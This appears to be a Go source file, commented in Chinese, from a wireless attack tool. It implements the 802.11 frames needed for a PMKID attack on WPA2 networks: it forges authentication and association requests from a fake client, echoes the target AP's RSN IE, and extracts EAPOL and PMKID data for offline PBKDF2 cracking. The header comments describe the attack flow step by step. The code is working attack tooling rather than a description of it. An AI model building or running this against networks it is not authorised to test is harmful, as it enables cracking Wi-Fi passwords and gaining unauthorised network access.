// assoc.go 补全 PMKID 攻击所需的 802.11 编解码：
// 认证/关联帧构造（攻击端扮演"假客户端"）、认证/关联响应与数据帧解析、
// 信息元素区通用提取、radiotap 信号强度读取。
//
// PMKID 攻击帧流程（802.11i PMKSA 缓存的标准行为，hashcat thread-7717）：
// 假客户端发 Open System 认证 → AP 回事务序号 2 → 假客户端发关联请求
// （原样回显 AP 信标中的 RSN IE）→ AP 为该 STA 生成 PMKID 并在
// EAPOL M1 key data / 关联响应 RSN IE 中返回 → 离线 PBKDF2 破解。
package ieee80211

import (
	"encoding/binary"
	"errors"
	"net"
)

const (
	// 管理帧子类型补全：PMKID 攻击与响应解析需要的其余几类。
	subtypeAssocReq   = 0
	subtypeAssocResp  = 1
	subtypeReassocReq = 2
	subtypeAuth       = 11

	// frameTypeData 是 802.11 帧类型字段中的数据帧取值（bit 2-3 = 10）。
	frameTypeData = 2
)

// 管理帧子类型的导出别名（与 frame.go 的导出惯例一致）。
const (
	SubtypeAssocReq   = subtypeAssocReq
	SubtypeAssocResp  = subtypeAssocResp
	SubtypeReassocReq = subtypeReassocReq
	SubtypeAuth       = subtypeAuth
)

// 信息元素编号（802.11 §9.4.2.1）。ElementRSN 导出供调用方按编号查找。
const (
	elementIDSSID          = 0
	elementIDSupportedRate = 1
	elementIDRSN           = 48

	// ElementRSN 是 RSN IE 的元素编号（0x30）。
	ElementRSN = elementIDRSN
)

// 管理帧体固定参数长度（TLV 信息元素区之前的部分）：
//   - 关联请求：能力信息(2) + 监听间隔(2)
//   - 关联响应：能力信息(2) + 状态码(2) + AID(2)
//   - 认证：认证算法(2) + 事务序号(2) + 状态码(2)
//   - 重关联请求：能力信息(2) + 监听间隔(2) + 当前 AP 地址(6)
const (
	assocReqFixedLen   = 4
	assocRespFixedLen  = 6
	authFixedLen       = 6
	reassocReqFixedLen = 10
)

// LLC/SNAP 封装头长度：AA AA 03 00 00 00 之后跟 2 字节 EtherType。
// EAPOL 在无线数据帧上必然走 802.2 LLC 封装（无 EtherType II 短帧），
// EtherType 0x888E 即 EAPOL。
const (
	llcSnapHeaderLen = 8
	EtherTypeEAPOL   = 0x888E
)

// associationCapability 组合能力信息：ESS + Privacy + Short Preamble +
// Short Slot Time（0x0431）。与消费级客户端发出的典型值一致，
// Privacy 置位声明"需要加密"，AP 才会对该 STA 启动 4-way 握手。
const associationCapability = 0x0431

// supportedRates 是 802.11b/g 速率集（1/2/5.5/11 为 basic，加 6/9/12/18）。
// 高位 0x80 即 basic 标记；缺失该 IE 的关联请求会被多数 AP 直接拒绝。
var supportedRates = []byte{0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24}

// BuildAuthenticationFrame 构造 Open System 认证帧（事务序号 1），
// PMKID 攻击第 1 步：向目标 AP 声明"我要认证"。
// Open System 认证对 WPA2 网络永远返回成功——真正的准入控制在
// 关联后的 4-way 握手，这正是 PMKID 攻击能走通的原因。
//
// STA → AP 方向：addr1 = BSSID（接收方），addr2 = STA（发送方，即
// 随机生成的假客户端地址），addr3 = BSSID。
func BuildAuthenticationFrame(sta, bssid net.HardwareAddr) ([]byte, error) {
	if len(sta) != 6 || len(bssid) != 6 {
		return nil, errors.New("MAC 地址长度错误，必须为 6 字节")
	}

	total := radiotapHeaderLen + macHeaderLen + authFixedLen
	frame := make([]byte, total)

	// Radiotap 最小头：仅声明自身长度，注入驱动按当前信道/速率发送。
	frame[0] = 0x00
	frame[1] = 0x00
	frame[2] = radiotapHeaderLen
	frame[3] = 0x00

	// Frame Control：subtype=11（认证）、type=00（管理帧），Flags 全 0。
	frame[8] = byte(subtypeAuth<<4 | frameTypeManagement<<2)
	frame[9] = 0x00

	copy(frame[12:18], bssid) // addr1：AP 接收
	copy(frame[18:24], sta)   // addr2：假客户端发送
	copy(frame[24:30], bssid) // addr3：所属 BSS

	// 认证帧体：算法 = Open System(0)，事务序号 = 1，状态码 = 0。
	body := frame[radiotapHeaderLen+macHeaderLen:]
	binary.LittleEndian.PutUint16(body[0:2], 0)
	binary.LittleEndian.PutUint16(body[2:4], 1)
	binary.LittleEndian.PutUint16(body[4:6], 0)

	return frame, nil
}

// BuildAssociationRequest 构造关联请求帧，PMKID 攻击第 2 步。
//
// rsnIE 必须是目标 AP 信标中 RSN IE 的载荷字节（不含 id/length 头），
// 原样回显让 AP 认定假客户端具备完整加密能力；空 RSN IE 意味着
// 开放网络，PMKID 无从谈起，调用方应在更早阶段拦截。
// ssid 回显进 SSID IE：多 SSID 虚拟 AP 会校验关联请求中的 SSID，
// 与自身配置不符时直接拒绝，不回显等于白白浪费一次尝试。
func BuildAssociationRequest(sta, bssid net.HardwareAddr, ssid string, rsnIE []byte) ([]byte, error) {
	if len(sta) != 6 || len(bssid) != 6 {
		return nil, errors.New("MAC 地址长度错误，必须为 6 字节")
	}
	if len(ssid) > 32 {
		return nil, errors.New("SSID 超过 802.11 协议上限 32 字节")
	}
	if len(rsnIE) > 255 {
		return nil, errors.New("RSN IE 载荷超过 255 字节上限")
	}

	// IE 区：SSID + 支持速率 + RSN（原样回显）。
	ies := make([]byte, 0, 2+len(ssid)+2+len(supportedRates)+2+len(rsnIE))
	ies = append(ies, elementIDSSID, byte(len(ssid)))
	ies = append(ies, ssid...)
	ies = append(ies, elementIDSupportedRate, byte(len(supportedRates)))
	ies = append(ies, supportedRates...)
	if len(rsnIE) > 0 {
		ies = append(ies, elementIDRSN, byte(len(rsnIE)))
		ies = append(ies, rsnIE...)
	}

	total := radiotapHeaderLen + macHeaderLen + assocReqFixedLen + len(ies)
	frame := make([]byte, total)

	frame[0] = 0x00
	frame[1] = 0x00
	frame[2] = radiotapHeaderLen
	frame[3] = 0x00

	// Frame Control：subtype=0（关联请求）、type=00（管理帧）。
	frame[8] = byte(subtypeAssocReq<<4 | frameTypeManagement<<2)
	frame[9] = 0x00

	copy(frame[12:18], bssid)
	copy(frame[18:24], sta)
	copy(frame[24:30], bssid)

	body := frame[radiotapHeaderLen+macHeaderLen:]
	binary.LittleEndian.PutUint16(body[0:2], associationCapability)
	// 监听间隔取 1 个信标周期：假客户端只等几秒的 EAPOL，不需要省电。
	binary.LittleEndian.PutUint16(body[2:4], 1)
	copy(body[assocReqFixedLen:], ies)

	return frame, nil
}

// ParseAuthentication 提取认证帧体三字段：算法、事务序号、状态码。
// PMKID 攻击用它确认 AP 的应答（事务序号 2、状态码 0）。
func ParseAuthentication(frame []byte) (algorithm uint16, transaction uint16, status uint16, err error) {
	if len(frame) < macHeaderLen+authFixedLen {
		return 0, 0, 0, errors.New("认证帧长度不足，帧体固定字段不完整")
	}
	if frameType := frame[0] >> 2 & 0x03; frameType != frameTypeManagement || int(frame[0]>>4) != subtypeAuth {
		return 0, 0, 0, errors.New("非认证管理帧（子类型不符）")
	}

	body := frame[macHeaderLen:]
	algorithm = binary.LittleEndian.Uint16(body[0:2])
	transaction = binary.LittleEndian.Uint16(body[2:4])
	status = binary.LittleEndian.Uint16(body[4:6])

	return algorithm, transaction, status, nil
}

// ParseAssociationResponse 提取关联响应的状态码（0 = 成功）。
// 能力信息与 AID 对 PMKID 攻击无意义，不解析。
func ParseAssociationResponse(frame []byte) (status uint16, err error) {
	if len(frame) < macHeaderLen+assocRespFixedLen {
		return 0, errors.New("关联响应帧长度不足，帧体固定字段不完整")
	}
	if frameType := frame[0] >> 2 & 0x03; frameType != frameTypeManagement || int(frame[0]>>4) != subtypeAssocResp {
		return 0, errors.New("非关联响应帧（子类型不符）")
	}

	return binary.LittleEndian.Uint16(frame[macHeaderLen+2 : macHeaderLen+4]), nil
}

// InfoElements 返回管理帧的 TLV 信息元素区（含各元素 id/length 头）。
// 固定参数长度按子类型映射；无 IE 区的子类型返回 false。
// 返回切片直接引用入参不拷贝，调用方只读使用。
func InfoElements(managementFrame []byte) ([]byte, bool) {
	if len(managementFrame) < macHeaderLen || managementFrame[0]>>2&0x03 != frameTypeManagement {
		return nil, false
	}

	var fixed int
	switch int(managementFrame[0] >> 4) {
	case subtypeBeacon, subtypeProbeResp:
		fixed = 12 // 时间戳(8) + 信标间隔(2) + 能力信息(2)
	case subtypeAssocReq:
		fixed = assocReqFixedLen
	case subtypeReassocReq:
		fixed = reassocReqFixedLen
	case subtypeAssocResp:
		fixed = assocRespFixedLen
	case subtypeAuth:
		fixed = authFixedLen
	default:
		// deauth/disassoc/action 等子类型没有 TLV 信息元素区。
		return nil, false
	}

	start := macHeaderLen + fixed
	if start > len(managementFrame) {
		return nil, false
	}

	return managementFrame[start:], true
}

// FindElement 在完整管理帧中查找指定编号的信息元素，返回其载荷字节
// （不含 id/length 头）。未找到或帧型不符返回 false。
func FindElement(managementFrame []byte, elementID byte) ([]byte, bool) {
	ies, ok := InfoElements(managementFrame)
	if !ok {
		return nil, false
	}

	return FindElementInIEs(ies, elementID)
}

// FindElementInIEs 在纯 TLV 序列（如 EAPOL M1 的 key data）中查找
// 指定编号的元素。截断/长度越界的 TLV 直接终止扫描：TLV 一旦错位，
// 后续字节不再可信，宁缺毋滥。
func FindElementInIEs(ies []byte, elementID byte) ([]byte, bool) {
	offset := 0
	for offset+2 <= len(ies) {
		length := int(ies[offset+1])
		if offset+2+length > len(ies) {
			return nil, false
		}

		if ies[offset] == elementID {
			return ies[offset+2 : offset+2+length], true
		}

		offset += 2 + length
	}

	return nil, false
}

// DataFrameInfo 是一帧数据帧的摘录：收发双方与 LLC/SNAP 解出的载荷。
// 802.11 规范恒定 addr1 = RA（接收方）、addr2 = TA（发送方），
// 与 toDS/fromDS 组合无关，收发双方永远可从固定偏移读取。
type DataFrameInfo struct {
	Receiver    net.HardwareAddr // addr1：接收方（RA）
	Transmitter net.HardwareAddr // addr2：发送方（TA）
	EtherType   uint16           // SNAP 解出的 EtherType；非 SNAP 封装为 0
	Payload     []byte           // EtherType 之后的字节（如 EAPOL 包体）
}

// ParseData 解析 802.11 数据帧（type=10），剥出 LLC/SNAP 载荷。
// WDS 4 地址帧与 QoS 数据帧的 MAC 头长度差异在此处理；
// 空数据帧（QoS Null/CF-ACK 等，无 LLC）返回长度错误，调用方忽略即可。
func ParseData(frame []byte) (DataFrameInfo, error) {
	if len(frame) < macHeaderLen {
		return DataFrameInfo{}, errors.New("帧长不足 24 字节，MAC 头不完整")
	}
	if frameType := frame[0] >> 2 & 0x03; frameType != frameTypeData {
		return DataFrameInfo{}, errors.New("非数据帧，仅解析 type=10 的数据帧")
	}

	flags := frame[1]
	toDS := flags&0x01 != 0
	fromDS := flags&0x02 != 0

	headerLen := macHeaderLen
	if toDS && fromDS {
		// WDS/mesh 4 地址帧：MAC 头多一个 SA 地址字段（6 字节）。
		headerLen += 6
	}
	if int(frame[0]>>4) >= 8 {
		// QoS 数据帧（子类型 8-15）：MAC 头尾部多 2 字节 QoS 控制。
		headerLen += 2
	}
	if len(frame) < headerLen+llcSnapHeaderLen {
		return DataFrameInfo{}, errors.New("数据帧长度不足，LLC/SNAP 头不完整（可能为空数据帧）")
	}

	info := DataFrameInfo{
		Receiver:    net.HardwareAddr(append([]byte(nil), frame[4:10]...)),
		Transmitter: net.HardwareAddr(append([]byte(nil), frame[10:16]...)),
	}

	// 仅 SNAP 封装（AA AA 03 00 00 00）携带 EtherType；
	// 纯 802.2 控制/未编号帧不承载 EAPOL，保持 EtherType=0 即可。
	llc := frame[headerLen : headerLen+llcSnapHeaderLen]
	if llc[0] == 0xAA && llc[1] == 0xAA && llc[2] == 0x03 && llc[3] == 0x00 && llc[4] == 0x00 && llc[5] == 0x00 {
		info.EtherType = binary.BigEndian.Uint16(llc[6:8])
		info.Payload = frame[headerLen+llcSnapHeaderLen:]
	}

	return info, nil
}

// radiotapFieldLayout 描述 radiotap 字段 0-5 的载荷长度与自然对齐。
// 按位号升序解析，拿到字段 5（信号强度）即返回，更高位字段
// （MCS/VHT/timestamp 等变长字段）不参与 RSSI 的对齐计算。
var radiotapFieldLayout = [...]struct {
	size  int
	align int
}{
	{8, 8}, // 0 TSFT（u64，微秒计时器）
	{1, 1}, // 1 Flags
	{1, 1}, // 2 Rate
	{4, 2}, // 3 Channel（u16 频率 MHz + u16 标志）
	{2, 2}, // 4 FHSS
	{1, 1}, // 5 dBm Antenna Signal（s8，负值）
}

// radiotapChannelField 是字段 3（Channel）在布局表中的位号。
const radiotapChannelField = 3

// ParseRadiotapChannel 从完整捕获帧提取接收信道编号。
// 频率→信道换算覆盖 2.4/5/6GHz 三个频段；无法解析或频段未收录
// （如 1.2GHz 业余段）返回 false，调用方按信道未知处理。
func ParseRadiotapChannel(frame []byte) (int, bool) {
	total, ok := RadioTapLen(frame)
	if !ok {
		return 0, false
	}

	presents := make([]uint32, 0, 2)
	offset := 4
	for {
		if offset+4 > total {
			return 0, false
		}

		present := binary.LittleEndian.Uint32(frame[offset:])
		presents = append(presents, present)
		offset += 4

		if present&(1<<31) == 0 {
			break
		}
		if len(presents) >= 8 {
			return 0, false
		}
	}

	if presents[radiotapChannelField/32]&(1<<(radiotapChannelField%32)) == 0 {
		return 0, false
	}

	// 与信号强度同样的游标推进：走到字段 3 之前，跳过字段 0-2 的字节。
	fieldStart := offset
	cursor := 0
	for bit := range radiotapChannelField {
		if presents[bit/32]&(1<<(bit%32)) == 0 {
			continue
		}

		layout := radiotapFieldLayout[bit]
		if pad := cursor % layout.align; pad != 0 {
			cursor += layout.align - pad
		}

		cursor += layout.size
	}

	// 字段 3 自身先对齐再读频率（前 2 字节）。
	if pad := cursor % radiotapFieldLayout[radiotapChannelField].align; pad != 0 {
		cursor += radiotapFieldLayout[radiotapChannelField].align - pad
	}

	pos := fieldStart + cursor
	if pos+2 > total {
		return 0, false
	}

	channel := frequencyToChannel(binary.LittleEndian.Uint16(frame[pos : pos+2]))
	if channel == 0 {
		return 0, false
	}

	return channel, true
}

// frequencyToChannel 把中心频率（MHz）换算为信道编号：
// 2.4GHz 信道 1-14、5GHz 信道号 = (freq-5000)/5、6GHz 信道 1-233。
// 未收录频率返回 0。
func frequencyToChannel(mhz uint16) int {
	switch {
	case mhz == 2484:
		return 14
	case mhz >= 2412 && mhz <= 2472:
		return int(mhz-2412)/5 + 1
	case mhz >= 5160 && mhz <= 5885:
		return int(mhz-5000) / 5
	case mhz >= 5955 && mhz <= 7115:
		return int(mhz-5955)/5 + 1
	default:
		return 0
	}
}

// ParseRadiotapSignal 从完整捕获帧（含 radiotap 头）提取天线信号强度，
// 单位 dBm（负值，-30 近距 / -90 边缘）。
//
// radiotap 的对齐规则：各字段按 present 位图编号升序排列，自然对齐。
// 对齐基准取字段区起点（present 位图链结束处）：present 链由 4 字节
// 单元构成，链结束偏移恒为 4 的倍数，因此对 ≤4 字节对齐的字段
// 该基准与"相对头部起点"等价，也与 Linux 内核/hcxtools 的实现一致。
func ParseRadiotapSignal(frame []byte) (int, bool) {
	total, ok := RadioTapLen(frame)
	if !ok {
		return 0, false
	}

	// present 位图链：每 4 字节一个 u32（小端），bit31=1 表示还有一个
	// 扩展位图。上限 8 个防畸形头部把解析拖成死循环。
	presents := make([]uint32, 0, 2)
	offset := 4
	for {
		if offset+4 > total {
			return 0, false
		}

		present := binary.LittleEndian.Uint32(frame[offset:])
		presents = append(presents, present)
		offset += 4

		if present&(1<<31) == 0 {
			break
		}
		if len(presents) >= 8 {
			return 0, false
		}
	}

	fieldStart := offset
	cursor := 0
	for bit := 0; bit <= 5; bit++ {
		if presents[bit/32]&(1<<(bit%32)) == 0 {
			continue
		}

		layout := radiotapFieldLayout[bit]
		if pad := cursor % layout.align; pad != 0 {
			cursor += layout.align - pad
		}

		if bit == 5 {
			pos := fieldStart + cursor
			if pos >= total {
				return 0, false
			}

			return int(int8(frame[pos])), true
		}

		cursor += layout.size
	}

	return 0, false
}
